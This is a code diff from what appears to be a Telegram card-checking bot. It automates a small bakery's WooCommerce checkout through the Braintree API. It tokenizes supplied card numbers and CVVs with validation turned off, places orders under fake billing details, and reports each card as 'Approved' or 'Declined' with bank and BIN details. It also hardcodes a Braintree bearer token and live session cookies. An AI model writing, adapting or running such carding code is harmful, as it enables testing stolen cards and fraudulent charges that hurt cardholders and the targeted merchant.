@@ -178,147 +178,152 @@ Progress 🔴 1.12(s)</b>""")
             
             #############
             headers = {
-              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-              #"content-type": "multipart/form-data; boundary=----WebKitFormBoundarybRdSFAAeBN90Y11G",
-              "origin": "https://healthyjoybakes.com",
-              "referer": "https://healthyjoybakes.com/?product=omega-power-bread",
-              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-              
-            }
-            data = {
-              'quantity': '1',
-              'add-to-cart': '18'
-              
-            }
-            r1 = requests.post('https://healthyjoybakes.com/?product=omega-power-bread', headers=headers, data=data)
-            #print(r1.text)
+          'authority': 'payments.braintree-api.com',
+          'accept': '*/*',
+          'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
+          'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTk2NTMwODgsImp0aSI6ImMzY2FkOTZlLTkzZjAtNDhlNS1iZThhLTY3ZTcyOTlmMDM2YSIsInN1YiI6IjloNXdweHg1anA2eG0zamQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjloNXdweHg1anA2eG0zamQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.xGf1-8X3vkYum6EkSd0tW7Tjwoq7X2FUtLqQjAq4PeTc7bVybShIsPrn1CrOdpvrbwxVKnDoeQxH9zLbjzLYqA',
+          'braintree-version': '2018-05-10',
+          'content-type': 'application/json',
+          'origin': 'https://assets.braintreegateway.com',
+          'referer': 'https://assets.braintreegateway.com/',
+          'sec-fetch-dest': 'empty',
+          'sec-fetch-mode': 'cors',
+          'sec-fetch-site': 'cross-site',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'
+          
+        }
+        data = {
+          "clientSdkMetadata": {
+            "source": "client",
+            "integration": "custom",
+            "sessionId": "63f17fda-0520-4aae-b04f-7bc93e03cf70"
             
-            headers = {
-              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-              "referer": "https://healthyjoybakes.com/?page_id=15",
-              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-		  
-             
-            }
-            r2 = requests.get('https://healthyjoybakes.com/?page_id=16', headers=headers)
-            print(r2.text)
-            noncecc = find_between(r2.text, 'credit_card","client_token_nonce":"', '"')
-            'db63a6892b'
-            print(noncecc)
-            
-            nonce_proc = find_between(r2.text, '"woocommerce-process-checkout-nonce" value="', '"')
-            
-            headers = {
-              "accept": "*/*",
-              "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-              "origin": "https://healthyjoybakes.com",
-              "referer": "https://healthyjoybakes.com/?page_id=16",
-              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-              "x-requested-with": "XMLHttpRequest",
-              
-            }
-            data = {
-              "action": "wc_braintree_credit_card_get_client_token",
-              "nonce": noncecc,
-              
-            }
-            r3 = requests.post('https://healthyjoybakes.com/wp-admin/admin-ajax.php', headers=headers, data=data)
-            print(r3.text)
-            
-            embearer = r3.text.strip('"data":"').strip('"')
-            decode = base64.decode(embearer)
-            bearer = decode.strip('"authorizationFingerprint":"').strip('"')
-         
-            
-            headers = {
-              'Accept': '*/*',
-              'Authorization': 'Bearer '+Bearer,
-              'Braintree-Version': '2018-05-10',
-              'Content-Type': 'application/json',
-              'Host': 'payments.braintree-api.com',
-              'Origin': 'https://assets.braintreegateway.com',
-              'Referer': 'https://assets.braintreegateway.com/',
-              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
-              
-            }
-            data = {
-              "clientSdkMetadata": {
-                "source": "client",
-                "integration": "custom",
-                "sessionId": "b2d994a8-8985-4448-952a-fc4b86bacbda"
+          },
+          "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+          "variables": {
+            "input": {
+              "creditCard": {
+                "number": cc,
+                "expirationMonth": mes,
+                "expirationYear": ano,
+                "cvv": cvv
                 
               },
-              "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
-              "variables": {
-                "input": {
-                  "creditCard": {
-                    "number": cc,
-                    "expirationMonth": mes,
-                    "expirationYear": ano,
-                    "cvv": cvv
-                    
-                  },
-                  "options": {
-                    "validate": False
-                    
-                  }
-                  
-                }
+              "options": {
+                "validate": False
                 
-              },
-              "operationName": "TokenizeCreditCard"
-              
-            }
-            r4 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=data)
-            if 'tokenizeCreditCard' in r4.text:
-              tokencc = r4.json()['data']['tokenizeCreditCard']['token']
-              
-              
-            headers = {
-              "accept": "application/json, text/javascript, */*; q=0.01",
-              "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-              "origin": "https://healthyjoybakes.com",
-              "referer": "https://healthyjoybakes.com/?page_id=16",
-              "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",	"x-requested-with": "XMLHttpRequest",
-              
-            }
-            data = {
-              'billing_first_name': s_nombre,
-        		  'billing_last_name': p_nombre,
-        		  'billing_company': '',
-        		  'billing_country': 'US',
-        		  'billing_address_1': 'street90',
-        		  'billing_address_2': '',
-        		  'billing_city': 'new york',
-        		  'billing_state': 'NY',
-        		  'billing_postcode': '10080',
-        		  'billing_phone': '305748'+Nlast4,
-        		  'billing_email': mail,
-        		  'account_password': '',
-        		  'shipping_first_name': s_nombre,
-        		  'shipping_last_name': p_nombre,
-        		  'shipping_company': '',
-        		  'shipping_country': 'MX',
-        		  'shipping_address_1': '',
-        		  'shipping_address_2': '',
-        		  'shipping_city': '',
-        		  'shipping_state': '',
-        		  'shipping_postcode': '',
-        		  'order_comments': '',
-        		  'payment_method': 'braintree_credit_card',
-        		  'wc-braintree-credit-card-card-type': 'visa',
-        		  'wc-braintree-credit-card-3d-secure-enabled': '',
-        		  'wc-braintree-credit-card-3d-secure-verified': '0',
-        		  'wc-braintree-credit-card-3d-secure-order-total': '24.73',
-        		  'wc_braintree_credit_card_payment_nonce': tokencc,
-        		  'wc_braintree_device_data': '',
-        		  'terms': 'on',
-        		  'terms-field': '1',
-        		  'woocommerce-process-checkout-nonce': nonce_proc,
-        		  '_wp_http_referer': '/?wc-ajax=update_order_review'
+              }
               
             }
             
-            r5 = requests.post('https://healthyjoybakes.com/?wc-ajax=checkout', headers=headers, data=data)
-            print(r5.text)
+          },
+          "operationName": "TokenizeCreditCard"
+          
+        }
+        res1 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=data)
+        token = find_between(res1.text, '"token":"','"')
+        msg1=await msg.edit(f"""<b>⎚Gateway | France
+Card: <code>{ccs}</code>
+Progress 🟠 4.40(s)</b>""")
+        
+        print(res1.text)
+          
+          
+        
+        headers = {
+          'authority': 'healthyjoybakes.com',
+          'method': 'POST',
+          'accept': 'application/json, text/javascript, */*; q=0.01',
+          'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8',
+          'x-requested-with': 'XMLHttpRequest',
+          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+          'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=BsEvlPjvdCPQ52sxrUD6k6eH; __qca=P0-1049935670-1698708014818; _hjSessionUser_432740=eyJpZCI6Ijk2MzZjZWIwLTNlOWUtNWVkOC1hYWJiLTA5YTU2NDI0OWUyMCIsImNyZWF0ZWQiOjE2OTg3MDgwMTgwMDAsImV4aXN0aW5nIjp0cnVlfQ==; tk_lr=%22%22; tk_r3d=%22%22; _gid=GA1.2.1838196269.1699566431; _hjIncludedInSessionSample_432740=1; _hjSession_432740=eyJpZCI6ImFkMzU1ZTYyLTFlMDItNDM1Mi1hYjRiLWY0MDNiNzM3OGViZSIsImNyZWF0ZWQiOjE2OTk1NjY0Mzg1ODYsImluU2FtcGxlIjp0cnVlLCJzZXNzaW9uaXplckJldGFFbmFibGVkIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; woocommerce_items_in_cart=1; wp_woocommerce_session_f5a2c2caae20f4f5cbd6bcf62bdf6a7e=t_d9bfa26aaf4ad392b828ff38ba24a1%7C%7C1699739243%7C%7C1699735643%7C%7C1c1a00c8abcfa7ba068a4e3c86fa164f; _ga_4CX7G3JLG8=GS1.1.1699566431.10.1.1699566590.0.0.0; _ga=GA1.1.350392337.1698708004; tk_qs=; woocommerce_cart_hash=09cf5af2dcd768ab2ffc233cbbd9faa5',
+          'origin': 'https://healthyjoybakes.com',
+          'referer': 'https://healthyjoybakes.com/?page_id=16',
+          'sec-fetch-dest': 'empty',
+          'sec-fetch-mode': 'cors',
+          'sec-fetch-site': 'same-origin',
+          'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
+          
+        }
+        data = {
+          'billing_first_name': first,
+          'billing_last_name': 'muno',
+          'billing_company': '',
+          'billing_country': 'US',
+          'billing_address_1': 'street90',
+          'billing_address_2': '',
+          'billing_city': 'new york',
+          'billing_state': 'NY',
+          'billing_postcode': '10080',
+          'billing_phone': '5052217458',
+          'billing_email': mail,
+          'account_password': '',
+          'shipping_first_name': '',
+          'shipping_last_name': '',
+          'shipping_company': '',
+          'shipping_country': 'MX',
+          'shipping_address_1': '',
+          'shipping_address_2': '',
+          'shipping_city': '',
+          'shipping_state': '',
+          'shipping_postcode': '',
+          'order_comments': '',
+          'payment_method': 'braintree_credit_card',
+          'wc-braintree-credit-card-card-type': 'visa',
+          'wc-braintree-credit-card-3d-secure-enabled': '',
+          'wc-braintree-credit-card-3d-secure-verified': '',
+          'wc-braintree-credit-card-3d-secure-order-total': '24.71',
+          'wc_braintree_credit_card_payment_nonce': token,
+          'wc_braintree_device_data': '',
+          'terms': 'on',
+          'terms-field': '1',
+          'woocommerce-process-checkout-nonce': '681a241094',
+          '_wp_http_referer': '/?wc-ajax=update_order_review'
+          
+        }
+        res2 = requests.post('https://healthyjoybakes.com/?wc-ajax=checkout', headers=headers, data=data)
+        msg2=await msg1.edit(f"""<b>⎚Gateway | France
+Card: <code>{ccs}</code>
+Progress 🟢 6.20(s)</b>""")
+        
+        print(res2.text)
+        
+        if 'Insufficient funds in account, please use an alternate card or other form of payment.' in res2.text:
+          status = "Approved✅"
+          msg = "Insufficient funds"
+        elif 'We cannot process your order with the payment information that you provided. Please use a different payment account or an alternate payment method.' in res2.text:
+          status = "Declined❌"
+          msg = "Card Declined"
+        elif 'success' in res2.text:
+          status = "Approved✅"
+          msg = "CVV CHARGED $24"
+        elif 'The provided card was declined, please use an alternate card or other form of payment.' in res2.text:
+          status = "Declined❌"
+          msg = "The provided card was declined"
+        elif 'The card type is invalid or does not correlate with the credit card number.  Please try again or use an alternate card or other form of payment.' in res2.text:
+          status = "Declined❌"
+          msg = "The card type is invalid or does not correlate with the credit card number"
+          
+          
+        await msg2.edit(f"""
+<b> 
+
+⊗ Card - <code>{ccs}</code> 
+⊗ Status - {status}
+⊗ Response - {res2.text}
+⊗ GATEWAY- France 
+－－－－－－－－－－－－－－
+[ BIN INFO ]
+⚆ Bin - {BIN} - {brand} - {typea} - {level}
+⚆ Bank - {bank} 🏛  
+⚆ Country - {country} - {country_flag} 
+－－－－－－－－－－－－－－
+[ CHECK INFO ]
+⌧ Proxy  - Live! ✅ 
+⌧ Time Test - 7.4sec
+⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
+⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
+－－－－－－－－－－－－－－</b>
+            """)
 
